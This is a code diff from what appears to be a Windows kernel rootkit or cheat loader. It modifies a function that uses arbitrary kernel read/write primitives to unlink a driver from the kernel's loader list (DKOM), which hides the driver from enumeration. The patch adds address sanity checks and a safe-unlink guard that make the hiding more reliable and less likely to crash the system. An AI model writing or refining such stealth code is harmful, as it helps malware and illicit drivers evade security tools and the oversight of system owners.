@@ -1291,20 +1291,42 @@ static void dkom_unlink_driver(UINT64 driver_kva) {
 
     UINT64 entry = flink;
     for (int iter = 0; iter < 512 && entry && entry != list_head; iter++) {
+        /* Sanity: all LDR entries must be kernel-canonical addresses */
+        if (entry < 0xFFFF800000000000ULL) {
+            logf("[!] DKOM: entry=0x%016llX not in kernel range — aborting walk",
+                 (unsigned long long)entry);
+            break;
+        }
         UINT64 dll_base = 0;
         if (!kread(entry + 0x030, 8, &dll_base)) break;
         if (dll_base == driver_kva) {
             UINT64 ef = 0, eb = 0;
             kread(entry + 0x000, 8, &ef);
             kread(entry + 0x008, 8, &eb);
-            if (ef && eb) {
-                kwrite(eb + 0x000, ef, 8); /* prev.Flink = next */
-                kwrite(ef + 0x008, eb, 8); /* next.Blink = prev */
-                kwrite(entry + 0x000, entry, 8); /* self-point to avoid dangling ptr */
-                kwrite(entry + 0x008, entry, 8);
-                logf("[+] DKOM: driver unlinked (entry=0x%016llX dll_base=0x%016llX)",
-                     (unsigned long long)entry, (unsigned long long)dll_base);
+            /* Kernel VA sanity: LDR entries must be in upper-canonical kernel range */
+            if (ef < 0xFFFF800000000000ULL || eb < 0xFFFF800000000000ULL) {
+                logf("[!] DKOM: ef=0x%016llX or eb=0x%016llX not in kernel range — skip",
+                     (unsigned long long)ef, (unsigned long long)eb);
+                return;
             }
+            /* Safe-unlink pre-check (mirrors Windows' own RemoveEntryList guard):
+               ef->Blink must equal entry, eb->Flink must equal entry.
+               If CR3 is off and gives garbage ef/eb, this catches it and aborts
+               instead of corrupting pool headers → KERNEL_SECURITY_CHECK_FAILURE. */
+            UINT64 ef_blink = 0, eb_flink = 0;
+            kread(ef + 0x008, 8, &ef_blink);
+            kread(eb + 0x000, 8, &eb_flink);
+            if (ef_blink != entry || eb_flink != entry) {
+                logf("[!] DKOM: list inconsistent ef->Blink=0x%016llX eb->Flink=0x%016llX entry=0x%016llX — skip",
+                     (unsigned long long)ef_blink, (unsigned long long)eb_flink, (unsigned long long)entry);
+                return;
+            }
+            kwrite(eb + 0x000, ef, 8); /* prev.Flink = next */
+            kwrite(ef + 0x008, eb, 8); /* next.Blink = prev */
+            kwrite(entry + 0x000, entry, 8); /* self-point Flink/Blink */
+            kwrite(entry + 0x008, entry, 8);
+            logf("[+] DKOM: driver unlinked (entry=0x%016llX dll_base=0x%016llX)",
+                 (unsigned long long)entry, (unsigned long long)dll_base);
             return;
         }
         UINT64 next = 0;
